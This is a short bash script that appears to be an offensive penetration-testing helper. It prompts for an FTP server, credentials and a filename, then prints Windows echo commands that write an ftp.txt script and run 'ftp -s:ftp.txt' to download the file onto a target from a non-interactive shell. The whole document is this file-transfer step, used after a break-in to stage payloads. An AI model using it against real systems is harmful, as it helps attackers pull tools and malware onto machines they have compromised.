#!/bin/bash

read -p "[+] FTP Server IP: " ip
read -p "[+] FTP Username: " user
read -p "[+] FTP Password: " pass
read -p "[+] GET filename: " fromfile

>&2 echo ""
echo "echo open $ip 21 > ftp.txt"
echo "echo $user >> ftp.txt"
echo "echo $pass >> ftp.txt"
echo "echo bin >> ftp.txt"
echo "echo GET $fromfile >> ftp.txt"
echo "echo bye >> ftp.txt"
echo "ftp -s:ftp.txt"
